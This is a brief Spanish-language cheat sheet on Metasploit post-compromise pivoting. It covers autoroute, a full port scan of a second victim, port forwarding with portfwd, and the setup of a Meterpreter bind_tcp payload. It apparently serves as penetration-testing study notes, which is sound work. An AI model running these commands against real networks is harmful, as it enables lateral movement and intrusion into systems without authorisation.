
----

## Manual



## Metasploit

1. Si comprometemos, sólo podremos **escanear desde dentro de metasploit**
- Al comprometer runa máquina añadiremos Rutas
```bash
meterpreter> run autoroute -s DirRed/Mascara
# renombramos las sesiones para que nos queden claras las redes
sessions -n Red1-Victim1 -i 1
```
- Scanner **TCP**
```bash

use scanner/portscan/tcp
set rhosts IPVictim2
set PORTS 0-65535
exploit
```
- Para **forwarding** 
> **-l:** Especificamos el puerto de la máquina atacante
    **-p:** Especificamos el port de la vítcima
     **-r:** Especifico la áquina Víctima
 
```bash
meterpreter>portfwd add -l 1234 -p 80 -r IPVictim2
```

- Escaneamos por el puerto dónde reenviamos, a ver que info de cada port
```bash
db_nmap -sS -sV -p 1234 localhost
```

 - Explotación
 >Abremos bind_shell y la víctima abre el Peuerto esperando conexiones

```bash
use elexploit que sea en ese puerto 80
set payload /windows/meterpreter/bind_tcp